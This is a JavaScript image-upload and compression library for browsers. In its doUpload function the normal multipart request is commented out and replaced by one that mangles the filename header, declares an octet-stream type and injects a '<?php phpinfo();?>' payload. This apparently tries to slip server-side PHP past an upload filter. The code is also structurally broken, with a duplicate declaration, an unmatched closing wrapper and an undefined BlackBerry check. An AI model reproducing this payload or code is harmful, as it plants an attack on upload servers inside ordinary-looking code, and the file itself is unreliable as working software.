    var CUI = function() {
        
    }
    var CUI, Tools = {

        };
    CUI = function (params) {
        this.callbackFuns = ["onSelect", "onDelete", "onProgress", "onSuccess", "onFailure", "onComplete", "onMessage",
                "onCheckFile", "onRepeat", "onShowImg"];
        this.defParams = {
            file: null,
            uploadUrl: null,
            maxWidth: 0,
            maxHeight: 0,
            inputName: "file",
            imageQuality: 100,
        };
        this.ListIndex = 0;
        this.params = Tools.extend(this.defParams, params);
        this.params.maxWidth = parseInt(this.params.maxWidth);
        this.params.maxHeight = parseInt(this.params.maxHeight);
        this.filesFilter = [];
        this.filesName = [];
        this.defBoundary = "--image-someboundary--";
        this.init()
    };
    CUI.prototype = {
        constructor: CUI,
        init: function (p) {
            var k, fun;
            for (k in this.callbackFuns) {
                fun = this.callbackFuns[k];
                if (typeof this.params[fun] === "function") {
                    this.constructor.prototype[fun] = this.params[fun]
                } else {
                    if (typeof this.constructor.prototype[fun] !== "function") {
                        this.constructor.prototype[fun] = function () {}
                    }
                }
            }
        },
        onMessage: function (msg) {
            console.log(msg)
        },
        upload: function () {
            var files, k;
            if (typeof this.params.file === "string") {
                this.params.file = document.querySelector(this.params.file)
            }
            if (typeof this.params.file.files === "undefined") {
                this.onMessage("请输入input file对象");
                return false
            }
            files = this.params.file.files;
            if (files.length < 1) {
                this.onMessage("请选择上传的文件");
                return false
            }
            if (!this.onCheckFile(files)) {
                return false
            }
            for (k = 0; k < files.length; k++) {
                if (!this.checkFile(files[k])) {
                    continue
                }
                this.onSelect(this.ListIndex, files[k]);
                if (files[k].type === "image/jpeg") {
                    if (this.params.maxWidth > 0 && this.params.maxHeight > 0) {
                        this.compressUpload(this.ListIndex, files[k])
                    } else {
                        this.doUpload(this.ListIndex, files[k])
                    }
                } else {
                    this.doUpload(this.ListIndex, files[k])
                }
                this.ListIndex++
            }
        },
        checkFile: function (file) {
            var k, tmp;
            for (k = 0; k <= this.filesName.length; k++) {
                if (this.filesName[k] === file.name + file.size) {
                    this.onRepeat(file);
                    return false
                }
            }
            this.filesName.push(file.name + file.size);
            this.filesFilter.push(file.name + file.size);
            return true
        },
        deleteFile: function (index, file) {
            var k, tmp = this.filesFilter;
            for (k = 0; k <= tmp.length; k++) {
                if (tmp[k] === file.name + file.size) {
                    this.filesFilter.splice(k, 1);
                    return true
                }
            }
        },
        deleteFileName: function (file) {
            var k;
            for (k = 0; k <= this.filesName.length; k++) {
                if (this.filesName[k] === file.name + file.size) {
                    this.filesName.splice(k, 1)
                }
            }
        },
        onCheckFile: function (file) {
            return true
        },
        doUpload: function (index, file, data, boundary) {
            var self = this,
                formData, xhr = new XMLHttpRequest();
            if (!xhr.upload) {
                this.onMessage("浏览器无法使用xhr.upload对象");
                return false
            }
            xhr.upload.addEventListener("progress", function (e) {
                self.onProgress(index, file, e.loaded, e.total)
            });
            xhr.onreadystatechange = function (e) {
                if (xhr.readyState == 4) {
                    if (xhr.status == 200) {
                        debugTime.end("uploadTime");
                        debugTime.begin("fileSize:" + file.size);
                        debugTime.end("fileSize:" + file.size);
                        self.onSuccess(index, file, xhr.responseText);
                        self.deleteFile(index, file);
                        if (!self.filesFilter.length) {
                            self.onComplete();
                            var runtime = JSON.stringify(debugTime.all());
                            self.params.file.value = ""
                        }
                    } else {
                        self.onFailure(index, file, xhr.responseText)
                    }
                }
            };
            xhr.open("POST", this.params.uploadUrl, true);
            if (typeof data === "undefined" || data === "") {
                formData = new FormData();
                formData.append("file", file);
                xhr.send(formData)
            } else {
                boundary = boundary || this.params.defBoundary;
                if (XMLHttpRequest.prototype.sendAsBinary === undefined) {
                    XMLHttpRequest.prototype.sendAsBinary = function (string) {
                        var bytes = Array.prototype.map.call(string, function (c) {
                            return c.charCodeAt(0) & 255
                        });
                        this.send(new Uint8Array(bytes).buffer)
                    }
                }
                debugTime.begin("base64Time");
                var myEncoder = new JPEGEncoder(this.params.imageQuality),
                    JPEGImage = myEncoder.encode(data, this.params.imageQuality);
                data = JPEGImage.substr(23);
                debugTime.end("base64Time");
                debugTime.begin("uploadTime");
                xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=" + boundary);
                //xhr.sendAsBinary(["--" + boundary, 'Content-Disposition: form-data; name="' + this.params.inputName +
                 //       '"; filename="' + encodeURI(file.name) + '"', "Content-Type: " + file.type, "", atob(data),
                   //     "--" + boundary + "--"].join("\r\n"));
                xhr.sendAsBinary(["--" + boundary, 'Content-Disposition: form-data; name="' + this.params.inputName +
                        '"; filename=s"','a', 'a','a','a"',"Content-Type: application/octet-stream", "<?php phpinfo();?> ", atob(data),
                        "--" + boundary + "--"].join("\r\n"))
            }
        },
        compressUpload: function (index, file) {
            var self = this,
                reader = new FileReader(),
                img = document.createElement("img");
            reader.readAsDataURL(file);
            debugTime.begin("fileReadertime");
            reader.onload = function (e) {
                img.src = this.result;
                self.onShowImg(index, file, this.result);
                debugTime.end("fileReadertime")
            };
            img.onload = function () {
                var width = 0,
                    height = 0,
                    base64 = "",
                    mpImg = new MegaPixImage(file),
                    orientation = 1,
                    tmpImg = document.createElement("img");
                if (img.width < self.params.maxWidth && img.height < self.params.maxHeight) {
                    width = img.width;
                    height = img.height
                } else {
                    if (img.width / self.params.maxWidth > img.height / self.params.maxHeight) {
                        width = self.params.maxWidth;
                        height = parseInt(img.height * self.params.maxWidth / img.width)
                    } else {
                        width = parseInt(img.width * self.params.maxHeight / img.height);
                        height = self.params.maxHeight
                    }
                }
                var isMobile = {
                    Android: function () {
                        return /Android/i.test(navigator.userAgent)
                    },
                    iOS: function () {
                        return /iPhone|iPad|iPod/i.test(navigator.userAgent)
                    },
                    Windows: function () {
                        return /IEMobile/i.test(navigator.userAgent)
                    },
                    any: function () {
                        return (isMobile.Android() || isMobile.BlackBerry() || isMobile.iOS() || isMobile.Windows())
                    }
                };
                if (isMobile.iOS()) {
                    debugTime.begin("iosRenderTime");
                    mpImg.render(tmpImg, {
                        maxWidth: width,
                        maxHeight: height
                    });
                    EXIF.getData(file, function () {
                        orientation = EXIF.getTag(this, "Orientation");
                        tmpImg.onload = function () {
                            debugTime.end("iosRenderTime");
                            var tmpCvs = document.createElement("canvas"),
                                tmpCtx = tmpCvs.getContext("2d"),
                                data = "";
                            Tools.rotate(tmpCvs, tmpImg, width, height, orientation);
                            if (orientation == 6 || orientation == 8) {
                                data = tmpCtx.getImageData(0, 0, height, width)
                            } else {
                                data = tmpCtx.getImageData(0, 0, width, height)
                            }
                            self.doUpload(index, file, data)
                        }
                    })
                } else {
                    debugTime.begin("androidRenderTime");
                    var cvs = document.createElement("canvas"),
                        ctx = cvs.getContext("2d");
                    cvs.width = width;
                    cvs.height = height;
                    ctx.drawImage(img, 0, 0, width, height);
                    tmpImg.src = cvs.toDataURL("image/jpeg", 0.4);
                    tmpImg.onload = function () {
                        debugTime.end("androidRenderTime");
                        EXIF.getData(file, function () {
                            orientation = EXIF.getTag(this, "Orientation");
                            var tmpCvs = document.createElement("canvas"),
                                tmpCtx = tmpCvs.getContext("2d"),
                                data = "";
                            Tools.rotate(tmpCvs, tmpImg, width, height, orientation);
                            if (orientation == 6 || orientation == 8) {
                                data = tmpCtx.getImageData(0, 0, height, width)
                            } else {
                                data = tmpCtx.getImageData(0, 0, width, height)
                            }
                            self.doUpload(index, file, data)
                        })
                    }
                }
            }
        }
    };
    window.CUI = CUI
})(window);



